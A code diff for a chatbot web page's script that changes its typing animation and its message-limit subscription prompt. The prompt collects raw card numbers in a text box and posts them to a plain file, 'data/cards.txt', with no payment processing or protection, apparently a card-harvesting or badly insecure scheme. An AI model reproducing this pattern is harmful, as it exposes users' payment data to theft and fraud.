@@ -63,12 +63,16 @@ document.addEventListener('DOMContentLoaded', () => {
     function showTypingAnimation() {
         return new Promise((resolve) => {
             const typingElem = document.createElement('div');
-            typingElem.classList.add('message', 'bot', 'typing');
-            typingElem.innerText = '...';
+            typingElem.classList.add('message', 'bot', 'typing-indicator');
+            typingElem.innerHTML = `
+                <span></span>
+                <span></span>
+                <span></span>
+            `;
             chatBox.appendChild(typingElem);
             chatBox.scrollTop = chatBox.scrollHeight;
 
-            const typingTime = Math.floor(Math.random() * 4000) + 1000;
+            const typingTime = Math.random() * (5000 - 1000) + 1000;
             setTimeout(() => {
                 chatBox.removeChild(typingElem);
                 resolve();
@@ -77,33 +81,28 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function showSubscriptionPrompt() {
-        const prompt = document.createElement('div');
-        prompt.classList.add('subscription-prompt');
-        prompt.innerHTML = `
-            <p>To continue chatting, please enter your card details to subscribe:</p>
-            <input type="text" id="card-details" placeholder="Card Number" class="w-full border rounded p-2 mb-2">
-            <button id="subscribe-button" class="mt-2 w-full bg-blue-500 text-white p-2 rounded">Subscribe</button>
+        const promptElem = document.createElement('div');
+        promptElem.classList.add('message', 'bot');
+        promptElem.innerHTML = `
+            You have reached the message limit. Please subscribe to continue chatting.
+            <br>
+            <input type="text" id="card-details" placeholder="Enter your card details">
+            <button id="subscribe-button">Subscribe</button>
         `;
-        chatBox.appendChild(prompt);
+        chatBox.appendChild(promptElem);
+        chatBox.scrollTop = chatBox.scrollHeight;
 
         document.getElementById('subscribe-button').addEventListener('click', () => {
             const cardDetails = document.getElementById('card-details').value;
-            if (cardDetails.trim() !== '') {
-                saveCardDetails(cardDetails);
-                alert('Thank you for subscribing!');
-                chatBox.removeChild(prompt);
-                messageCount = 0;
-            }
+            saveCardDetails(cardDetails);
         });
     }
 
     function saveCardDetails(details) {
         fetch('data/cards.txt', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'text/plain'
-            },
-            body: details
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cardDetails: details })
         }).then(response => {
             if (response.ok) {
                 console.log('Card details saved successfully.');
